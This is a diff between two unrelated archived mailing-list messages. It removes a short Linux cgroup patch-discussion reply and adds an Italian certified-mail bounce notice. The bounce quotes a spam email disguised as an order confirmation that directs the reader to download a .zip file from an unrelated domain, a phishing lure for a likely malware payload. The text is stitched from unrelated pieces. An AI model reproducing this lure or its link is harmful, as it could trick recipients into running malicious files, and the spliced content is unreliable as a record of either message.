@@ -1,17 +1,10 @@
-From: Glauber Costa <glommer-bzQdu9zFT3WakBO8gow8eQ@public.gmane.org>
-Subject: Re: [PATCHSET] cgroup: cftype based file interface, take #2
-Date: Wed, 4 Apr 2012 00:37:37 +0400
-Message-ID: <4F7B5F91.7030405__16094.7776203558$1333485561$gmane$org@parallels.com>
-References: <1332368265-21586-1-git-send-email-tj@kernel.org>
-	<20120330222936.GI28934@google.com>
-	<4F7A6D13.4060704@parallels.com>
-	<20120403184719.GB27794@dhcp-172-17-108-109.mtv.corp.google.com>
-	<20120403185216.GD27794@dhcp-172-17-108-109.mtv.corp.google.com>
+From: Posta Certificata Legalmail <posta-certificata-uAB2pouQAuvkqfQpfK8e+Q@public.gmane.org>
+Subject: ERRORE: Messaggio rifiutato dal sistema
+Date: Wed, 4 Apr 2012 05:23:39 +0200 (CEST)
+Message-ID: <16487.0049957701$1333510198@news.gmane.org>
 Mime-Version: 1.0
-Content-Type: text/plain; charset="us-ascii"; Format="flowed"
-Content-Transfer-Encoding: 7bit
+Content-Type: multipart/mixed; boundary="===============5138996313300953600=="
 Return-path: <containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
-In-Reply-To: <20120403185216.GD27794-RcKxWJ4Cfj1J2suj2OqeGauc2jM2gXBXkQQo+JxHRPFibQn6LdNjmg@public.gmane.org>
 List-Unsubscribe: <https://lists.linuxfoundation.org/mailman/options/containers>,
 	<mailto:containers-request-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org?subject=unsubscribe>
 List-Archive: <http://lists.linuxfoundation.org/pipermail/containers/>
@@ -21,26 +14,97 @@ List-Subscribe: <https://lists.linuxfoundation.org/mailman/listinfo/containers>,
 	<mailto:containers-request-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org?subject=subscribe>
 Sender: containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
 Errors-To: containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
-To: Tejun Heo <tj-DgEjT+Ai2ygdnm+yROfE0A@public.gmane.org>
-Cc: ctalbott-hpIqsD4AKlfQT0dZR+AlfA@public.gmane.org, rni-hpIqsD4AKlfQT0dZR+AlfA@public.gmane.org, fweisbec-Re5JQEeQqe8AvxtiuMwx3w@public.gmane.org, containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org, linux-kernel-u79uwXL29TY76Z2rM5mHXA@public.gmane.org, cgroups-u79uwXL29TY76Z2rM5mHXA@public.gmane.org
+To: Support <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
 List-Id: containers.vger.kernel.org
 
-On 04/03/2012 10:52 PM, Tejun Heo wrote:
-> On Tue, Apr 03, 2012 at 11:47:19AM -0700, Tejun Heo wrote:
->> Hello, Glauber.
->>
->> On Tue, Apr 03, 2012 at 07:22:59AM +0400, Glauber Costa wrote:
->>> Do I need to send you a patch to remove memcg's populate on top of this ?
->>
->> populate is already gone.  My memory is a bit fuzzy now.  Can you spot
->> something broken / to be improved re. memcg cftypes in the current
->> cgroup/for-3.5 branch?
->
-> Ugh... brainfart.  Please disregard the previous message.  Can you
-> please resend the patches on top of cgroup/for-3.5 and use Li's new
-> address - lizefan-hv44wF8Li93QT0dZR+AlfA@public.gmane.org ?
->
-> Thanks.
->
-All right.
-I'll give a new test to make sure it is still okay, and send shortly
+--===============5138996313300953600==
+Content-Type: multipart/report; report-type=delivery-status;
+	boundary="----=_Part_834462_27799118.1333509819294"
+
+------=_Part_834462_27799118.1333509819294
+Content-Type: text/plain; charset="ISO-8859-1"
+Content-Transfer-Encoding: 7bit
+
+Messaggio rifiutato dal sistema.
+Le caselle destinatarie di seguito indicate ricevono esclusivamente messaggi di posta elettronica certificata oppure sono caselle di servizio riservate al gestore:
+
+comune.ospitaletto-uAB2pouQAuvkqfQpfK8e+Q@public.gmane.org - casella che riceve solo Posta Certificata
+------=_Part_834462_27799118.1333509819294
+Content-Type: message/delivery-status
+Content-Transfer-Encoding: 7bit
+
+Reporting-MTA: dns; legalmail.it
+
+Final-Recipient: rfc822;comune.ospitaletto-uAB2pouQAuvkqfQpfK8e+Q@public.gmane.org
+Action: failed
+Status: 5.0.0 (casella che riceve solo Posta Certificata)
+
+------=_Part_834462_27799118.1333509819294
+Content-Type: message/rfc822
+
+Received: from s15383287.onlinehome-server.info (s15383287.onlinehome-server.info [217.160.7.221])
+	by lefpec03.dmz.infocert.it (8.13.8/8.13.8) with ESMTP id q343Nc1l014168
+	for <comune.ospitaletto-uAB2pouQAuvkqfQpfK8e+Q@public.gmane.org>; Wed, 4 Apr 2012 05:23:38 +0200
+Received: from s15383287.onlinehome-server.info (qxJ-46-48 [217.160.7.221]) by s15383287.onlinehome-server.info (mailer) with SMTP id LzM90J8pk4pm for <comune.ospitaletto-uAB2pouQAuvkqfQpfK8e+Q@public.gmane.org>; Tue, 03 Apr 2012 23:26:58 -0400
+Date: Tue, 03 Apr 2012 23:26:58 -0400
+From: "Support" <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
+Message-ID: <69153433.47262116147179-1a9OacWFFnxscSfvKI1GhlkDBhES+CswOmWvHUIwkkk@public.gmane.org>
+To: <comune.ospitaletto-uAB2pouQAuvkqfQpfK8e+Q@public.gmane.org>
+Subject: {LINE[s9]}
+MIME-Version: 1.0
+Content-Type: text/plain;charset=utf-8
+X-Virus-Scanned: clamav-milter 0.96.5 at lefpec03.dmz.infocert.it
+X-Virus-Status: Clean
+X-Brightmail-Tracker: AAAAARqBnB0=
+X-BMI-Spam: spam
+Content-Transfer-Encoding: quoted-printable
+
+
+
+
+
+Grazie per l'inserimento di un ordine con noi!
+
+Desideriamo informarLa che abbiamo ricevuto il vostro ordine e verra elab=
+orato molto presto. Il vostro numero d'ordine e 666-666 e si dovrebbe ess=
+ere consegnato entro 2-5 giorni lavorativi. Si prega di notare che nella =
+maggior parte dei casi, la consegna e piu veloce indicato come vogliamo f=
+arvi iniziare a godere l'acquisto il piu presto possibile. Nel frattempo,=
+ si puo accedere al sito e verificare lo stato dell'ordine in qualsiasi m=
+omento tramite la pagina 'Il mio Account'.
+
+Se avete domande sul tuo ordine, non esitate a contattarci via email a su=
+pport-8+Fz2nuxnMdx6Cjg0PwtpTYe/PSvh27I@public.gmane.org Non appena ordine e stato spedito, il nostro e=
+secutivo Servizio Clienti monitorare i progressi e tenervi aggiornati in =
+ogni momento.
+
+Richiedi il tuo premio speciale
+
+Ancora una volta, vorremmo ringraziarvi per il vostro acquisto e speriamo=
+ di rivedervi presto.
+Fare clic sul seguente link per il pagamento e le informazioni di consegn=
+a
+http://aktiv-utazas.hu/conteggio/Dettagli.zip?toeacc=3Dcomune.ospitaletto=
+@legalmail.it
+
+
+
+Contro la forza la ragion non vale.
+Responsabile Servizio Clienti
+your-gadgets.it
+
+
+
+------=_Part_834462_27799118.1333509819294--
+
+--===============5138996313300953600==
+Content-Type: text/plain; charset="us-ascii"
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Disposition: inline
+
+_______________________________________________
+Containers mailing list
+Containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
+https://lists.linuxfoundation.org/mailman/listinfo/containers
+--===============5138996313300953600==--
